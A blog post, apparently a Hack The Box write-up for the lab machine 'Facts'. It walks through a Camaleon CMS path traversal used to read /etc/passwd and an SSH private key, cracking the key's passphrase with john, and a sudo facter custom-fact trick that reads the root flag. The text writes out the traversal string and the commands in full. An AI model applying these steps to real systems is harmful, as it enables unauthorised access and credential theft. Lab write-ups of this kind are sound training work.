---
layout: post
title: "Facts (Easy) - HTB writeup"
---

# Introduction
Facts is an easy machine, where we use a path traversal vulnerability in the Camaleon CMS to read a ssh key. It is protected with a passphrase so we crack it and gain ssh access to user.\
The user can run a _facter_ tool as sudo which has a functionality that allows us to execute commands which we use to retrieve root flag.

# USER 

After using nmap, we see 22, 80 and 54321 ports are open.

```bash
$ sudo nmap -sV -sC -p- -A -T4 -v facts.htb -o nmap/tcp
Discovered open port 22/tcp on 10.129.33.80
Discovered open port 80/tcp on 10.129.33.80
Discovered open port 54321/tcp on 10.129.33.80
```
\
The website itself doesn't have any interesting functionality, so we fuzz for directories.
```bash
$ gobuster dir -u 'facts.htb' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
...
/randomfacts          (Status: 301) [Size: 178] [--> http://facts.htb/randomfacts/]
/index                (Status: 200) [Size: 11113]
/rss                  (Status: 200) [Size: 183]
/sitemap              (Status: 200) [Size: 3508]
/en                   (Status: 200) [Size: 11109]
/search               (Status: 200) [Size: 19187]
/page                 (Status: 200) [Size: 19593]
/welcome              (Status: 200) [Size: 11966]
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/post                 (Status: 200) [Size: 11308]
```

There's an admin endpoint, and upon visiting we see that we can register a new user. After registering and logging in we are met with Camaleon CMS dashboard panel.

![dashboard]({{ site.url }}/images/facts/dashboard.png)
\
\
In the bottom right corner we see the version which is **2.9.0**\
After searching for vulnerabilities we find [CVE-2025-2304](https://nvd.nist.gov/vuln/detail/CVE-2025-2304) and [CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987). The former is a privilege escalation vulnerability and after exploiting it and gaining Administrator role, nothing interesting appeared on the dashboard. The latter is a path traversal vulnerability that was addressed in version 2.8.2 and there aren't any workarounds for it which means our version is still vulnerable.
\
\
*A path traversal vulnerability accessible via MediaController's download_private_file method allows authenticated users to download any file on the web server*
\
\
I couldn't find a PoC so we can look around the source code and see the vulnerability for ourselves.

```ruby
 # download private files
      def download_private_file
        cama_uploader.enable_private_mode!

        file = cama_uploader.fetch_file("private/#{params[:file]}")

        return render plain: helpers.sanitize(file[:error]) if file.is_a?(Hash) && file[:error].present?

        send_file file, disposition: 'inline'
      end
```

\
There is no sanitization whatsoever. Now we need to find the endpoint that lets us download files.
\
Inside **download_private_file_spec.rb** there's a line that tells us the endpoint: 
```ruby
get '/admin/media/download_private_file', params: { file: 'some_file' }
```

I'll send a request to download /etc/passwd and intercept it in burp.

![burp_passwd]({{ site.url }}/images/facts/burp_passwd.png)
\
\
We can see there are 2 users, william and trivia. There are no ssh keys inside william's .ssh directory but trivia had one. To get it we just set the file parameter to
```
../../../../../../home/trivia/.ssh/id_ed25519S
```
\
If we try to actually authenticate using this key we will be asked for a passphrase. We can use john to get the hash and crack it.

```bash
$ ssh2john id_ed25519 > hash

$ john hash --wordlist=~/Downloads/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
```

We can now ssh with the passphrase 'dragonballz'
\
The flag is inside /home/william directory

# ROOT

Running ```sudo -l``` gives us the following output:
```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

We can run **/usr/bin/facter** as sudo. It's a tool that collects system facts.
\
It has an option that lets us use custom facts: ```[--custom-dir]  A directory to use for custom facts.```
\
Inside the docs I found this [page](https://help.puppet.com/core//current/Content/PuppetCore/executing_shell_commands_in_facts.htm?Highlight=Execution) with some interesting info on how facter executes shell commands to get system information. At the bottom there's an example code for a custom fact.

```ruby
Facter.add('hardware_platform') do
setcode do
Facter::Core::Execution.execute('/bin/uname --hardware-platform')
end
end
```

We can modify this code to read the root flag 

```ruby
#fact.rb
Facter.add('root_flag') do
setcode do
Facter::Core::Execution.execute('cat /root/root.txt')
end
end
```

Now just create the directory and put our file there.
\
Then we run:
```bash
trivia@facts:~$ sudo facter --custom-dir custom_fact/ > out
trivia@facts:~$ cat out | grep root_flag
root_flag => [REDACTED]
```
And we have the root flag.

Thanks for reading my writeup!


